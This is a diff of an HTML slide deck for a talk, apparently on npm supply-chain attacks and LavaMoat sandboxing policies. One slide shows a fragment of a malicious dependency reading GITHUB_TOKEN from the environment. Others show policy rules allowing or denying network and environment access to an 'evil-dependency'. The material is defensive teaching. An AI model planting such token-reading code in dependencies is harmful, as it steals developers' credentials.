@@ -174,7 +174,7 @@
         <section>
           <br><br>
           <!-- <h1>I'm running code from the internet!</h1> -->
-          <h1>Eval All The Strings!</h1>
+          <h1>I run code from the Internet!</h1>
 
           <br>
           <h4>🌩️</h4>
@@ -251,16 +251,22 @@
 </section>
 <section>
   <section>
-    <h1> DEMO 🪄 </h1>
-
-  <br> <br> <br>
+    <h1> 🪄 </h1>
+    <br>
+    <h3> How does it work? </h3>
+  <br> <br>
+  Demo:
+  <br>
           <a style="font-size: 0.6em" href="https://github.com/naugtur/i-run-code-from-the-internet">https://github.com/naugtur/i-run-code-from-the-internet</a>
 
   </section>
+  <section data-markdown class="whitehat">
+    ## Let's install 
+    ## that build tool
+  </section>
   <section data-markdown class="blackhat">
     <textarea>
-#### oh, look, a package
-
+#### Look what I did
 
 ```
 const credentials = process.env["GITHUB_TOKEN"];
@@ -288,33 +294,33 @@ package.json:
 
 ---
 
-#### look what it found
+#### the policy
       
 ```js
 ./lavamoat/node/policy.json:
 "that-eslint-plugin>evil-dependency": {
-"builtin": {
-  "https.request": true
-},
-"globals": {
-  "process.env": true
-},
+ "builtin": {
+   "https.request": true
+ },
+ "globals": {
+   "process.env": true
+ },
 
 ```
 
 ---
 
-#### look what it found
+#### the policy
       
 ```js
 ./lavamoat/node/policy.json:
 "that-eslint-plugin>evil-dependency": {
-"builtin": {
-  "https": false
-},
-"globals": {
-  "process": false
-},
+ "builtin": {
+   "https": false
+ },
+ "globals": {
+   "process": false
+ },
 
 ```
     
@@ -368,6 +374,15 @@ within the same process.
 https://github.com/tc39/proposal-compartments
 
         </textarea>
+      </section>
+      <section data-markdown>
+        ### There's also a bundler
+
+        1. browserify based
+        2. webpack plugin (WIP)
+        
+        Wanna help with the plugin?
+
       </section>
       <section>
 
